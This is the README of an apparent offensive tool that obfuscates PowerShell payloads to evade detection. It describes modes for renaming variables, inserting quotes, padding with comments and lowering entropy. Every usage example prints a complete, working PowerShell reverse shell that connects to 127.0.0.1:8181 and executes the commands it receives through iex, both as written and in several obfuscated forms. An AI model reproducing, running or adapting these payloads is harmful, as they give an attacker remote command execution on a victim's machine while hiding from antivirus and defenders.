# auto_powershell_obfuscation - Beta

## Description

An automated tool for obfuscation of a powershell script.
This tool is for experimental purposes, I am not responsible for your actions.

## Usage

```
python3 obfuscator.py -f <YOUR_PAYLOAD> -m <MODE>
```

```powershell
PS C:\auto_powershell_obfuscation> python3 .\obfuscator.py -f .\test_payload.txt

New Payload 

$48b23f7aaadc4e96932c24c2fd6c1430 = N""ew-Object Sy''s""tem.Net.Sockets.TCPClient('127.0.0.1',8181);$be30aeef96bc427db72645b20e22b4bc = $48b23f7aaadc4e96932c24c2fd6c1430.GetStream();[byte[]]$0e2e781a1e26488f98d4d5057254669d = 0..65535|%{0};while(($143b0ba8bb9d4270963f5d48892cf60e = $be30aeef96bc427db72645b20e22b4bc.Read($0e2e781a1e26488f98d4d5057254669d, 0, $0e2e781a1e26488f98d4d5057254669d.Length)) -ne 0){;$b98b18b0b96a4336ab5c1b5f53172f6e = (New-Object -TypeName Syst""em.Text.ASCIIEncoding).GetString($0e2e781a1e26488f98d4d5057254669d,0, $143b0ba8bb9d4270963f5d48892cf60e);$82f0188570bb4842ae4d302dec137166 = (i""ex $b98b18b0b96a4336ab5c1b5f53172f6e 2>&1 | Out-String );$8a7ef545026b4a2e807bc6a667c70cbe = $82f0188570bb4842ae4d302dec137166 + 'PS ' + (pwd).Path + '> ';$2e6d40d1196a40569af7fac1184d3696 = ([text.encoding]::ASCII).GetBytes($8a7ef545026b4a2e807bc6a667c70cbe);$be30aeef96bc427db72645b20e22b4bc.Write($2e6d40d1196a40569af7fac1184d3696,0,$2e6d40d1196a40569af7fac1184d3696.Length);$be30aeef96bc427db72645b20e22b4bc.Flush()};$48b23f7aaadc4e96932c24c2fd6c1430.Close()

New payload entropy: 5.138376499232824
```

## Mode

### Var

**var** mode only changes the names of your variables according to the entropy rules.

```powershell
PS C:\auto_powershell_obfuscation> python .\obfuscator.py -m var -f .\payload.txt 

$4fe310251c7d4c8f937142076d281ce6 = New-Object System.Net.Sockets.TCPClient('127.0.0.1',8181);$45cbaabdf14f45a191c972b6307a6abb = $4fe310251c7d4c8f937142076d281ce6.GetStream();[byte[]]$95c66e4518fc49bdbe1a369ca1fa4588 = 0..65535|%{0};while(($b9285b898cbe4628aa860f2608aa2195 = $45cbaabdf14f45a191c972b6307a6abb.Read($95c66e4518fc49bdbe1a369ca1fa4588, 0, $95c66e4518fc49bdbe1a369ca1fa4588.Length)) -ne 0){;$f26c594770184cb9ad926878184d061d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($95c66e4518fc49bdbe1a369ca1fa4588,0, $b9285b898cbe4628aa860f2608aa2195);$2031bb366ddb4bd0a88e411227464baa = (iex $f26c594770184cb9ad926878184d061d 2>&1 | Out-String );$5dc4676c22014043b312ff6e180ba5ff = $2031bb366ddb4bd0a88e411227464baa + 'PS ' + (pwd).Path + '> ';$5d584a8b541a4220b78f14b13a6c9ee9 = ([text.encoding]::ASCII).GetBytes($5dc4676c22014043b312ff6e180ba5ff);$45cbaabdf14f45a191c972b6307a6abb.Write($5d584a8b541a4220b78f14b13a6c9ee9,0,$5d584a8b541a4220b78f14b13a6c9ee9.Length);$45cbaabdf14f45a191c972b6307a6abb.Flush()};$4fe310251c7d4c8f937142076d281ce6.Close()
```

### Boolean

**boolean** mode replaces simple $True or $False with equivalent boolean expressions.

`$True` => `[bool]1254`

### Quote - Beta

**quote** mode will sprinkle your code with quotation marks where they don't disturb the flow (/!\ beware /!\ this mode is not completely finished, check that it works properly before using it)

```powershell
C:\auto_powershell_obfuscation> python .\obfuscator.py -m quote -f .\payload.txt

$client = New-Object Sys""t''em.Net.Sockets.TCPClient('127.0.0.1',8181);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (N''ew-Object -TypeName Sy''st''em.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (p""wd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Gcm

**gcm** mode uses a trick that replaces cmdlets with a gcm call. This method reduces the entropy of our payload but also makes it slightly less efficient.

```powershell
PS C:\auto_powershell_obfuscation> python .\obfuscator.py -m gcm -f .\payload.txt

```

### Commentropy

**commentropy** mode creates long comments in your payload and reduces the entropy of your payload.

```powershell
PS C:\auto_powershell_obfuscation> python .\obfuscator.py -f .\payload.txt -m commentropy
$client <#*********************************#>=<#*******************************#> New-Object System.Net.Sockets.TCPClient('127.0.0.1',8181);$stream <#*********************************#>=<#*******************************#> $client.GetStream();[byte[]]$bytes <#*********************************#>=<#*******************************#> 0..65535|%{0};while(($i <#*********************************#>=<#*******************************#> $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data <#*********************************#>=<#*******************************#> (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback <#*********************************#>=<#*******************************#> (iex $data 2>&1 | Out-String );$sendback2 <#*********************************#>=<#*******************************#> $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte <#*********************************#>=<#*******************************#> ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Entropy

**entropy** mode allows you to calculate the entropy of your payload.

```powershell
C:\auto_powershell_obfuscation> python .\obfuscator.py -m entropy -f .\payload.txt

5.265027259625534
```
